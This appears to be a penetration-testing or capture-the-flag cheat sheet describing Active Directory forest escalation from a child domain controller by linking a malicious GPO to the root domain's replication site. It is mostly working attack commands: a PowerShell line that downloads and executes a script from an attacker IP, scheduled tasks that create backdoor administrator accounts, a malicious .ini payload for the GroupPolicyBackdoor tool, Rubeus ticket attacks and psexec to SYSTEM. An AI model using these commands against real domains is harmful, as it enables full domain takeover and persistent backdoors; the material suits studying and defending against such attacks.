Using SYSTEM on child domain controller it is possible to create a malicious GPO with some task or other payload. This GPO can be then linked as SYSTEM to the replication site, which **spreads it over the whole domain including the parent DC**.

This bypasses many trust/SID-filtering boundaries because it never relies on cross-domain user tokens — it abuses forest-wide replication and site-level GPO application.

## Local Workflow


1. Create a malicious Group Policy Object (GPO) on the Child Domain Controller (DC). 

```powershell
$gpo = "NewBD"
New-GPO $gpo
```

with malicious Scheduled task:

```powershell

IEX(New-Object Net.WebClient).downloadString('http://10.10.16.xxx/PowerView_old.ps1'); New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor12345' -GPODisplayName "newBD" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user Admin Password1"

```


2. Query the Root Domain to identify the replication site of the Root Domain.

```powershell

#powershell

Get-ADDomainController -Identity root-dc.root.local | Select-Object Site

# OR PowerView (older versions)
Get-DomainController -Domain root.local | select Site

#ouptut
CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=root,DC=local
```

3. Link the created GPO to the Default Replication Site of the Root DC as SYSTEM

```powershell

# as nt authority\system

$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=root,DC=local"

New-GPLink -Name "NewBD" -Target $sitePath -Server dev.root.local

```


4. Upon completion of replication, confirm the presence of the created GPO within the Root DC.
  
```powershell
# get TGT
.\rubeus.exe asktgt /user:Admin /password:'Password1' /domain:inlanefreight.ad /ptt /nowrap

# ptt attack
.\rubeus.exe ptt /ticket:$blob

# check
klist

# access flag

type \\DC01\flag\flag.txt
```
  

## Remote Workflow

For Remote exploitation let's use very nice script provided by synack: https://github.com/synacktiv/GroupPolicyBackdoor/wiki/06_Commands-and-Cheatsheet 

Get the root domain SID first:

```powershell

(Get-ADDomain -Identity (Get-ADForest).RootDomain).DomainSID.Value
S-1-5-21-2879935145-656083549-3766571964

```

Create GPO:

```bash
#create GPO
python3 gpb.py gpo create -d dev.INLANEFREIGHT.AD  --dc 'dev.domain.local' -u 'Administrator' -p 'pass' -n 'TEST_GPO' -v --root-domain-sid 'S-1-5-21-2879935145-656083549-3766571964'
```

Check created GPO:

```bash

python3 gpb.py enum gpo-details -d 'dev.INLANEFREIGHT.AD' --dc 'DC02.dev.INLANEFREIGHT.AD' -u 'administrator' -p 'pass' -n 'TEST_GPO' -v   

  

**GPB - GPO-DETAILS command - 2026-05-09 15:02:35.752594**

[INFO] GPO has GUID A5A593C9-0B78-4C0C-A840-F6A49EE06376 and exists

```

Forge malicious `.ini`:

```bash
# edit: ImmediateTask_add_admin.ini

[MODULECONFIG]
name = Scheduled Tasks
type = computer

[MODULEOPTIONS]
action = create
program = cmd.exe
arguments = /c net user Administrator Password1
  
```

Inject GPO with malicious payload:

```bash
#assign malicious scheduled task
python3 gpb.py gpo inject -d 'dev.domain.local' --dc 'DC02.dev.domain.local' -u 'administrator' -p 'pass' -n 'TEST_GPO' -m modules_templates/ScheduledTask_create.ini  -v

```

Identify the Root's replication site:
```bash
ldapsearch -H ldap://dc01.inlanefreight.ad -D "CN=Administrator,CN=Users,DC=dev,DC=domain,DC=local" -w 'pass' -b "CN=Configuration,DC=domain,DC=local" "(&(objectClass=server)(name=DC01))" dNSHostName serverReference

# extended LDIF

#

# LDAPv3

# base <CN=Configuration,DC=inlanefreight,DC=ad> with scope subtree

###.... 

# THIS IS the distinguished name of the container YOU need!
dn: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=DOMAIN,DC=LOCAL
```

THE distinguished name you need is part of the above output :

"CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=DOMAIN,DC=LOCAL"

Link the malicious GPO to the root replication site (you must be SYSTEM for that):

```bash

impacket-psexec administrator:'pass'@DC02.dev.DOMAIN.LOCAL

# IMPORTANT !!!! YOU MUST BE SYSTEM!!!
C:\ whoami
nt authority\system

C:\ $sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=root,DC=local"

C:\ New-GPLink -Name "TEST_GPO" -Target $sitePath -Server dev.root.local
  
```

The Task is then executed and you can enjoy your backdoor!